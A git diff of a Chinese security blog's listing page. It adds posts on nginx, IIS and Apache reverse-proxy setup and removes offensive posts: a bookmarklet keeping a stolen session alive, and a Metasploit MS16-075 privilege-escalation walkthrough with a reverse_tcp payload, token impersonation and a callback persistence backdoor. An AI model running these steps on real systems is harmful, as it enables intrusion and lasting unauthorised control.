@@ -255,7 +255,254 @@
 
 <div class="article-categories">
   <span></span>
-  <a class="article-category-link" href="/categories/linux/">linux</a>►<a class="article-category-link" href="/categories/linux/工具/">工具</a>
+  <a class="article-category-link" href="/categories/杂七杂八/">杂七杂八</a>►<a class="article-category-link" href="/categories/杂七杂八/工具/">工具</a>
+</div>
+
+
+</div>
+
+
+
+
+<div class="comments-count">
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand post" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2018/04/03/windows下删除不掉文件夹：找不到该项目无法删除文件夹/" title="windows下删除不掉文件夹：找不到该项目无法删除文件夹" itemprop="url">windows下删除不掉文件夹：找不到该项目无法删除文件夹</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
+		
+  <p class="article-time">
+    <time datetime="2018-04-03T10:04:51.000Z" itemprop="datePublished"> 发表于 2018-04-03</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <p><img src="http://opgnaclz6.bkt.clouddn.com/23.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在cmd中rd /S 文件夹名或路径</span><br></pre></td></tr></table></figure>
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/杂七杂八/">杂七杂八</a>►<a class="article-category-link" href="/categories/杂七杂八/windows7/">windows7</a>
+</div>
+
+
+</div>
+
+
+
+
+<div class="comments-count">
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand post" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2018/04/03/Nginx反向代理泛目录、目录、整站方法 nginx反向代理配置详解/" title="nginx设置反向代理" itemprop="url">nginx设置反向代理</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
+		
+  <p class="article-time">
+    <time datetime="2018-04-03T10:04:51.000Z" itemprop="datePublished"> 发表于 2018-04-03</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <p>常见的nginx代理配置 nginx反向代理配置<br>有前缀二级泛目录反向代理<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       80;                                                         </span><br><span class="line">    server_name  ***.com;                                               </span><br><span class="line"></span><br><span class="line">    location /abc &#123;</span><br><span class="line">        proxy_pass http://ip/abc;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>目录反向代理<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       80;                                                         </span><br><span class="line">    server_name  ***.com;                                               </span><br><span class="line"></span><br><span class="line">    location /abc/ &#123;</span><br><span class="line">        proxy_pass http://ip/abc/;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>整站反向代理<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       80;                                                         </span><br><span class="line">    server_name ***.com;                                               </span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass http://www.***.com/;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>重定向报文代理<br>即便配置了nginx代理，当服务返回重定向报文时（http code为301或302），会将重定向的目标url地址放入http response报文的header的location字段内。用户浏览器收到重定向报文时，会解析出该字段并作跳转。此时新的请求报文将直接发送给服务地址，而非nginx地址。为了能让nginx拦截此类请求，必须修改重定向报文的location信息。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">location /my/ &#123;</span><br><span class="line">    proxy_pass http://my_server;</span><br><span class="line">    proxy_set_header Host <span class="variable">$host</span>:<span class="variable">$server_port</span>;</span><br><span class="line"></span><br><span class="line">    proxy_redirect / /my/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>使用proxy_redirect可以修改重定向报文的location字段，例子中会将所有的根路径下的url代理到nginx的/my/路径下返回给用户。比如服务返回的重定向报文的location原始值为/login，那么经过nginx代理后，用户收到的报文的location字段为/my/login。此时，浏览器将会跳转到nginx的/my/login地址进行访问。 </p>
+<p>需要注意的是，服务返回的重定向报文的location字段有时会填写绝对路径（包含服务的ip/域名和端口），有时候会填写相对路径，此时需要根据实际情况进行甄别。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">location /my/ &#123;</span><br><span class="line">    proxy_pass http://my_server;</span><br><span class="line">    proxy_set_header Host <span class="variable">$host</span>:<span class="variable">$server_port</span>;</span><br><span class="line"></span><br><span class="line">    proxy_redirect http://my_server/ http://<span class="variable">$host</span>:<span class="variable">$server_port</span>/my/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>上述配置便是将my_server服务的根路径下的所有路径代理到nginx地址的/my/路径下。当nginx配置只有一个server时，http://$host:$server_port前缀可以省略。 </p>
+<p>报文数据替换<br>使用nginx代理最牛（dan）逼（sui）的情况就是http响应报文内写死了服务地址或web绝对路径。写死服务地址的情况比较少见，但也偶尔存在。最棘手的是写死了web绝对路径，尤其是绝对路径都没有公共前缀。举个例子来说： </p>
+<p>一般的web页面会包含如下类似路径：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/public：用于静态页面资源，如js脚本/public/js，样式表/public/css，图片/public/img等。 </span><br><span class="line">/static：和/public类似。 </span><br><span class="line">/api：用于后台服务API接口。 </span><br><span class="line">/login：用于登录验证。</span><br></pre></td></tr></table></figure></p>
+<p>其他。<br>对于这样的服务，可能的代理配置如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">location /my/ &#123;</span><br><span class="line">    proxy_pass http://my_server/;</span><br><span class="line">    proxy_set_header Host <span class="variable">$host</span>:<span class="variable">$server_port</span>;</span><br><span class="line"></span><br><span class="line">    proxy_redirect / /my/;</span><br><span class="line">&#125;</span><br><span class="line">location /login/ &#123;</span><br><span class="line">    proxy_pass http://my_server/public;</span><br><span class="line">    proxy_set_header Host <span class="variable">$host</span>:<span class="variable">$server_port</span>;</span><br><span class="line">&#125;</span><br><span class="line">location /public/ &#123;</span><br><span class="line">    proxy_pass http://my_server/public;</span><br><span class="line">    proxy_set_header Host <span class="variable">$host</span>:<span class="variable">$server_port</span>;</span><br><span class="line">&#125;</span><br><span class="line">location /api/ &#123;</span><br><span class="line">    proxy_pass http://my_server/api;</span><br><span class="line">    proxy_set_header Host <span class="variable">$host</span>:<span class="variable">$server_port</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>由于web页面或静态资源内写死了类似的绝对路径，那么对于用户来说，通过页面内的链接进行跳转时，都会请求到nginx服务对应的路径上。一旦存在另一个服务也包含类似的路径，也需要nginx进行代理，那么矛盾就出现了：访问nginx的同一个路径下的请求究竟转发给哪一个服务？ </p>
+<p>要解决这个问题，必须在用户收到报文前，将报文的数据中包含的绝对路径都添加统一的前缀，如/my/public，/my/api，/my/login，这样nginx代理配置则可以简化为：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">location /my/ &#123;</span><br><span class="line">    proxy_pass http://my_server/;</span><br><span class="line">    proxy_set_header Host <span class="variable">$host</span>:<span class="variable">$server_port</span>;</span><br><span class="line"></span><br><span class="line">    proxy_redirect / /my/;</span><br><span class="line">&#125;</span><br><span class="line">location /other/ &#123;</span><br><span class="line">    proxy_pass http://other_server/;</span><br><span class="line">    proxy_set_header Host <span class="variable">$host</span>:<span class="variable">$server_port</span>;</span><br><span class="line"></span><br><span class="line">    proxy_redirect / /other/;</span><br><span class="line">&#125;nginx的ngx_http_sub_module模块提供了类似的报文数据替换功能，该模块默认不会安装，需要在编译nginx时添加–with-http_sub_module参数，或者直接下载nginx的rpm包。</span><br></pre></td></tr></table></figure></p>
+<p>使用sub_filter对数据包进行替换的语法如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">location /my/ &#123;</span><br><span class="line">    proxy_pass http://my_server/;</span><br><span class="line">    proxy_set_header Host <span class="variable">$host</span>:<span class="variable">$server_port</span>;</span><br><span class="line">    </span><br><span class="line">    sub_filter <span class="string">'href="/'</span> <span class="string">'href="/my/'</span>;</span><br><span class="line">    sub_filter <span class="string">'src="/'</span> <span class="string">'src="/my/'</span>;</span><br><span class="line">    sub_filter_types text/html;</span><br><span class="line">    sub_filter_once  off;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>上述配置会将/my/下的所有响应报文内容的href=”/替换为href=”/my，以及src=”/替换为src=”/my，即为所有的绝对路径添加公共前缀。 </p>
+<p>注意，如果需要配置多个sub_filter，必须保证nginx是1.9.4版本之上的。即便如此，sub_filter也不能解决所有问题。目前流行的js框架都会有自动渲染url的功能，也就是说，很多绝对路径并非写死在静态页面内，也是由js代码框架动态生成的，面对这样的情况，sub_filter也是无能为力了。对于这样的情况，笔者只能由衷地奉劝，还是安静的改代码吧！ </p>
+
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/SEO/">SEO</a>►<a class="article-category-link" href="/categories/SEO/反向代理/">反向代理</a>
+</div>
+
+
+</div>
+
+
+
+
+<div class="comments-count">
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand post" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2018/04/03/iis设置反向代理/" title="iis设置反向代理" itemprop="url">iis设置反向代理</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
+		
+  <p class="article-time">
+    <time datetime="2018-04-03T10:04:51.000Z" itemprop="datePublished"> 发表于 2018-04-03</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <p>如何应用Application Request Routing在IIS7配置反向代理<br>工具：</p>
+<ul>
+<li><a href="Routing]http://www.iis.net/extensions/ApplicationRequestRouting">Application Request</a></li>
+<li><a href="https://www.iis.net/downloads/microsoft/web-platform-installer" target="_blank" rel="noopener">WebPlatformInstaller</a></li>
+<li><a href="https://www.jb51.net/softs/561307.html" target="_blank" rel="noopener">rewrite_amd64_zh-CN.msi</a><br>安装完后在IIS管理界面找到ARR配置菜单:Application Request Routing<br>点击右测开启Proxy项:server proxy settings..<br>打开配置界面 在Enable proxy前面打勾保存<br>在站点下建立web.config保存代码<br>iis7全站反向代理设置<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;</span><br><span class="line">&lt;configuration&gt;</span><br><span class="line">    &lt;system.webServer&gt;</span><br><span class="line">        &lt;rewrite&gt;</span><br><span class="line">            &lt;rules&gt;</span><br><span class="line">                &lt;rule name=<span class="string">"fxdl"</span> stopProcessing=<span class="string">"true"</span>&gt;</span><br><span class="line">                    &lt;match url=<span class="string">"^(.*)"</span> /&gt;</span><br><span class="line">                    &lt;conditions&gt;</span><br><span class="line">                        &lt;add input=<span class="string">"&#123;HTTP_HOST&#125;"</span> pattern=<span class="string">"(.*)"</span> ignoreCase=<span class="string">"false"</span> /&gt;</span><br><span class="line">                    &lt;/conditions&gt;</span><br><span class="line">                    &lt;action <span class="built_in">type</span>=<span class="string">"Rewrite"</span> url=<span class="string">"http://www.d58.net/&#123;R:1&#125;"</span> /&gt;</span><br><span class="line">                &lt;/rule&gt;</span><br><span class="line">            &lt;/rules&gt;</span><br><span class="line">        &lt;/rewrite&gt;</span><br><span class="line">    &lt;/system.webServer&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>iis7二级目录反向代理设置<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;</span><br><span class="line">&lt;configuration&gt;</span><br><span class="line">    &lt;system.webServer&gt;</span><br><span class="line">        &lt;rewrite&gt;</span><br><span class="line">            &lt;rules&gt;</span><br><span class="line">                &lt;rule name=<span class="string">"fxdl"</span> stopProcessing=<span class="string">"true"</span>&gt;</span><br><span class="line">                    &lt;match url=<span class="string">"^news(.*)"</span> /&gt;</span><br><span class="line">                    &lt;conditions&gt;</span><br><span class="line">                        &lt;add input=<span class="string">"&#123;HTTP_HOST&#125;"</span> pattern=<span class="string">"(.*)"</span> ignoreCase=<span class="string">"false"</span> /&gt;</span><br><span class="line">                    &lt;/conditions&gt;</span><br><span class="line">                    &lt;action <span class="built_in">type</span>=<span class="string">"Rewrite"</span> url=<span class="string">"http://www.jioze.cn/news&#123;R:1&#125;"</span> /&gt;</span><br><span class="line">                &lt;/rule&gt;</span><br><span class="line">            &lt;/rules&gt;</span><br><span class="line">        &lt;/rewrite&gt;</span><br><span class="line">    &lt;/system.webServer&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure></p>
+
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/SEO/">SEO</a>►<a class="article-category-link" href="/categories/SEO/反向代理/">反向代理</a>
+</div>
+
+
+</div>
+
+
+
+
+<div class="comments-count">
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand post" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2018/04/03/Apache设置反向代理目录的方法/" title="Apache设置反向代理" itemprop="url">Apache设置反向代理</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
+		
+  <p class="article-time">
+    <time datetime="2018-04-03T10:04:51.000Z" itemprop="datePublished"> 发表于 2018-04-03</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <p>设置反向代理有三个文件要用apache目录下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\conf\httpd.conf</span><br><span class="line">\conf\extra\httpd-proxy.conf</span><br><span class="line">\conf\extra\httpd-vhosts.conf</span><br></pre></td></tr></table></figure></p>
+<p>1.设置httpd.conf<br>打开Apache24/conf文件夹下的httpd.conf设置文件，找到一下几行把前面的注释‘#’删除<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LoadModule proxy_module modules/mod_proxy.so</span><br><span class="line">LoadModule proxy_connect_modulemodules/mod_proxy_connect.so</span><br><span class="line">LoadModule proxy_ftp_modulemodules/mod_proxy_ftp.so</span><br><span class="line">LoadModuleproxy_http_modulemodules/mod_proxy_http.so</span><br></pre></td></tr></table></figure></p>
+<p>(Ps:很多人都会注释LoadModuleproxy_balancer_modulemodules/mod_proxy_balancer.so，然而这个是做负载均衡用的一个功能，单纯做反向代理的话，不需要用这个，而且取消了这里的注释不进行相应的设置的话，会导致apache服务无法开启)<br>然后找到<br>Include conf/extra/httpd-vhosts.conf<br>这一行前面的注释‘#’也删除，引入这个文件 </p>
+<p>apache反向代理全站<br><code>`</code>bash</p>
+<virtualhost *:80=""><br>    ServerAdmin <a href="mailto:webmaster@127.0.0.1" target="_blank" rel="noopener">webmaster@127.0.0.1</a>    #主机名<br>    #DocumentRoot “d:/**/htdocs/xx.com”<br>    ServerName 127.0.0.1<br>    ServerAlias 127.0.0.1<br>    #ErrorLog “logs/xx.com-error.log”<br>    #CustomLog “logs/xx.com-access.log” common<br>     ProxyPass /  <a href="http://127.0.0.1:8888/" target="_blank" rel="noopener">http://127.0.0.1:8888/</a><br><br></virtualhost> 
+
+<p>apache反向代理二级目录 </p>
+<virtualhost *:80=""><br>    ServerAdmin <a href="mailto:webmaster@127.0.0.1" target="_blank" rel="noopener">webmaster@127.0.0.1</a>    #主机名<br>    #DocumentRoot “d:/**/htdocs/xx.com”<br>    ServerName 127.0.0.1<br>    ServerAlias 127.0.0.1<br>    #ErrorLog “logs/xx.com-error.log”<br>    #CustomLog “logs/xx.com-access.log” common<br>     ProxyPass /abc  <a href="http://127.0.0.1:8888/abc" target="_blank" rel="noopener">http://127.0.0.1:8888/abc</a><br><br></virtualhost> 
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/SEO/">SEO</a>►<a class="article-category-link" href="/categories/SEO/反向代理/">反向代理</a>
 </div>
 
 
@@ -544,357 +791,7 @@
 
 <div class="article-categories">
   <span></span>
-  <a class="article-category-link" href="/categories/提权免杀/">提权免杀</a>►<a class="article-category-link" href="/categories/提权免杀/windows提权/">windows提权</a>
-</div>
-
-
-</div>
-
-
-
-
-<div class="comments-count">
-	
-</div>
-
-</footer>
-
-
-    </article>
-
-
-
-
-
-
-   
-    
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
-    
-      <a href="/2018/02/27/保证session不被服务器因超时注销/" title="即可保证session不被服务器因超时注销" itemprop="url">即可保证session不被服务器因超时注销</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
-		
-  <p class="article-time">
-    <time datetime="2018-02-27T08:42:19.000Z" itemprop="datePublished"> 发表于 2018-02-27</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <p>拿到服务器后很容易被服务器注销，因此我们可以用javascript来写段代码<br>使用方法:<br>拿到偷到的session登陆后,再地址栏敲入下面代码,即可保证session不被服务器因超时注销.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javascript:(function sogili() &#123;</span><br><span class="line">    setInterval(function () &#123;_ = new XMLHttpRequest || new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);_.open(&quot;GET&quot;, location);_.send(null);&#125;, 60000);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure></p>
-
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-<div class="article-catetags">
-
-<div class="article-categories">
-  <span></span>
-  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/XSS/">XSS</a>
-</div>
-
-
-</div>
-
-
-
-
-<div class="comments-count">
-	
-</div>
-
-</footer>
-
-
-    </article>
-
-
-
-
-
-
-   
-    
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
-    
-      <a href="/2018/01/15/MS16-075提权/" title="MS16-075提权" itemprop="url">MS16-075提权</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
-		
-  <p class="article-time">
-    <time datetime="2018-01-15T10:37:51.000Z" itemprop="datePublished"> 发表于 2018-01-15</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <blockquote>
-<p>目标IP:192.168.163.134<br>接收反弹的IP：192.168.163.129  //注意：必须是外网IP<br>本机IP：192.168.163.120</p>
-</blockquote>
-<h3 id="1，在本机MSF框架执行："><a href="#1，在本机MSF框架执行：" class="headerlink" title="1，在本机MSF框架执行："></a>1，在本机MSF框架执行：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.163.134  LPORT=3306 -f exe -o 3306.exe</span><br></pre></td></tr></table></figure>
-<p><img src="http://opgnaclz6.bkt.clouddn.com/6.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-<p>其中windows/meterpreter/reverse_tcp反弹端口类型，lhost是反弹连接的服务器Ip地址，注意该ip地址必须是独立服务器，或者必须是外网端口映射，换句话说，就是反弹必须能够接收，lport为反弹的端口，3306为生成的程序.</p>
-<h3 id="2，在监听服务器上执行监听命令"><a href="#2，在监听服务器上执行监听命令" class="headerlink" title="2，在监听服务器上执行监听命令"></a>2，在监听服务器上执行监听命令</h3><p>（1）启动msf<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Msfconsole</span><br></pre></td></tr></table></figure></p>
-<p> <img src="http://opgnaclz6.bkt.clouddn.com/7.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-<p> （2）配置meterpreter参数<br> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; use exploit/multi/handler</span><br><span class="line">meterpreter &gt; <span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line">meterpreter &gt; <span class="built_in">set</span> LHOST 192.233.23.23</span><br><span class="line">meterpreter &gt; <span class="built_in">set</span> LPORT 4433</span><br><span class="line">Exploit</span><br></pre></td></tr></table></figure></p>
-<p><img src="http://opgnaclz6.bkt.clouddn.com/8.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-<p>注：（如果反弹回来不是目标，则background再exploit）</p>
-<h3 id="3，上传3306-exe程序到目标服务器及执行"><a href="#3，上传3306-exe程序到目标服务器及执行" class="headerlink" title="3，上传3306.exe程序到目标服务器及执行"></a>3，上传3306.exe程序到目标服务器及执行</h3><p><img src="http://opgnaclz6.bkt.clouddn.com/9.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-<h3 id="4上传ms16-075文件"><a href="#4上传ms16-075文件" class="headerlink" title="4上传ms16-075文件"></a>4上传ms16-075文件</h3><p>通过webshll上传potato.exe文件，或者在msf下面执行命令上传：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; upload /root/potato.exe C:\\inetpub\\wwwroot\\dede</span><br></pre></td></tr></table></figure></p>
-<p>查看当前目录</p>
-<p><img src="http://opgnaclz6.bkt.clouddn.com/10.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-<p>如图：已经再当前目录就不需要跳转目录了，如果不是则<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> C:\\inetpub\\wwwroot\\dede</span><br><span class="line">meterpreter &gt; use incognito</span><br></pre></td></tr></table></figure></p>
-<p><img src="http://opgnaclz6.bkt.clouddn.com/11.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-<p>如图已经返回SYSTEM了<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; list_tokens -u</span><br><span class="line">NT AUTHORITY\IUSR</span><br><span class="line">meterpreter &gt; execute -cH -f ./potato.exe</span><br><span class="line">meterpreter &gt; list_tokens -u</span><br><span class="line">NT AUTHORITY\IUSR</span><br><span class="line">NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; impersonate_token “NT AUTHORITY\\SYSTEM”</span><br></pre></td></tr></table></figure></p>
-<p><img src="http://opgnaclz6.bkt.clouddn.com/12.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"><br>如图，第一次我执行NT AUTHORITY\SYSTEM失败了，因为少了一个/<br>meterpreter &gt; getuid<br>Server username: NT AUTHORITY\SYSTEM<br>得到SYSTEM后你可以进shell添加管理员账户密码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure></p>
-<p>或者留下后门<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run?persistence?-X?-i?10?-p?6666?-r?192.168.163.129</span><br></pre></td></tr></table></figure></p>
-
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-<div class="article-catetags">
-
-<div class="article-categories">
-  <span></span>
-  <a class="article-category-link" href="/categories/提权免杀/">提权免杀</a>►<a class="article-category-link" href="/categories/提权免杀/windows提权/">windows提权</a>
-</div>
-
-
-</div>
-
-
-
-
-<div class="comments-count">
-	
-</div>
-
-</footer>
-
-
-    </article>
-
-
-
-
-
-
-   
-    
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
-    
-      <a href="/2018/01/15/MS16-032提权/" title="MS16-032提权" itemprop="url">MS16-032提权</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
-		
-  <p class="article-time">
-    <time datetime="2018-01-15T10:37:51.000Z" itemprop="datePublished"> 发表于 2018-01-15</time>
-    
-  </p>
-</header>
